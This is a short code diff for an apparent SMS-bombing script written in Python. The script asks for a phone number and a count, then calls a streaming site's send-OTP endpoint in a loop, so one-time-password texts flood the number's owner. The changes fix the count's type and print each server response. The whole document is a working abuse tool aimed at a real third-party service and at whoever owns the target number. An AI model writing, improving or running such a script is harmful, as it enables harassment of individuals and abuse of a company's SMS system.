@@ -1,13 +1,14 @@
 import requests
-import IMTIAZ-X
 
 #GET
-number=str(input(" Enter Your Number : "))
+number=str(input(" Enter The Number : "))
 
-amount=str(input(" Enter Your Amount : "))
+amount=int(input(" Enter The Amount : "))
 
 api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
 
 for i in range(amount):
-    requests.get(api)
-    print(str(i+1)+"Send SMS")
+    resp = requests.get(api)
+    print(str(i+1)+" SMS Sent")
+    print(resp.text)
+    
